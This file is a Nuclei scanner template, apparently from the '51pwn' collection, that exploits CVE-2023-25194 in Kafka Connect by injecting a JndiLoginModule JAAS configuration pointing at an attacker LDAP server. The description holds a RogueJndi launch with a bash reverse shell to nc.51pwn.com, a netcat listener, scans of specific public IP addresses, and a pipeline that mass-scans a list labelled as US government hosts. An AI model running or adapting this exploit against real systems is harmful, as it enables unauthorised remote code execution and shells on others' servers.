id: CVE-2023-25194_51pwn

info:
  name: CVE-2023-25194_51pwn
  author: 51pwn
  severity: critical
  description: |
    Kafka Connect RCE via connector SASL JAAS JndiLoginModule configuration

    http.title:"UI for Apache Kafka"
    
    java -jar RogueJndi-1.1.jar --hostname 127.0.0.1 --ldapPort 1389 --httpPort 8000 -c "bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/nc.51pwn.com/9999<&1"
    Starting RMI registry on port 1097
    Starting HTTP server on 0.0.0.0:8000
    Starting LDAP server on 0.0.0.0:1389
    Mapping ldap://127.0.0.1:1389/o=commons-collections7 to artsploit.controllers.CommonsCollections7
    Mapping ldap://127.0.0.1:1389/o=dummy to artsploit.controllers.Dummy
    Mapping ldap://127.0.0.1:1389/ to artsploit.controllers.RemoteReference
    Mapping ldap://127.0.0.1:1389/o=reference to artsploit.controllers.RemoteReference
    Mapping ldap://127.0.0.1:1389/o=scala-enable-unsafe-commons-deser to artsploit.controllers.Scala

    nc -nlvp 9999
    nuclei -duc -t $PWD/config/51pwn/CVE-2023-25194.yaml -debug -u  http://176.79.33.152:7001
    nuclei -duc -t $PWD/config/51pwn/CVE-2023-25194.yaml -debug -u http://135.181.39.55:8123
    cat atckData/us_gov_httpx.json|jq '.url'|sed 's/"//g'|sort -u|nuclei -duc -t $PWD/config/51pwn/CVE-2023-25194.yaml -json -o us_gov_CVE-2023-25194.json
  reference:
    - https://hackerone.com/reports/1529790
    - https://github.com/ohnonoyesyes/CVE-2023-25194
    - https://www.oschina.net/news/228187
    - https://51pwn.com
  tags: web,cve,2023

requests:
  - raw:
      - |+
        GET / HTTP/1.1
        Host: {{Hostname}}

      - |+
        POST /connectors HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Content-Type: application/json
        Connection: close

        {"name": "test", 
          "config":
            {
              "connector.class":"io.debezium.connector.mysql.MySqlConnector",
              "database.hostname": "xxxxx",
              "database.port": "3306",
              "database.user": "root",
              "database.password": "xxxxxx",
              "database.dbname": "xxxx",
              "database.sslmode": "SSL_MODE",
              "database.server.id": "1234",
              "database.server.name": "localhost",
              "table.include.list": "MYSQL_TABLES",
              "tasks.max":"1",
              "topic.prefix": "aaa22",
              "debezium.source.database.history": "io.debezium.relational.history.MemoryDatabaseHistory",
              "schema.history.internal.kafka.topic": "aaa22",
              "schema.history.internal.kafka.bootstrap.servers": "kafka:9202",
              "database.history.producer.security.protocol": "SASL_SSL",
              "database.history.producer.sasl.mechanism": "PLAIN",
              "database.history.producer.sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://poc.51pwn.com:1389\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxxx\";"
            }
        }

      # end
    unsafe: true
    cookie-reuse: true
    req-condition: true
    matchers-condition: and
    stop-at-first-match: true
    matchers:
      - type: dsl
        condition: and
        dsl:
          - status_code_1==200
          - contains(body_1,"UI for Apache Kafka")
          - status_code_2==201
      # - type: word
      #   part: body
      #   words:
      #     - ".springframework."
      #     - ".kafka.ui."
      #     - "org.springframework.security.web.server.context."
      #   condition: and
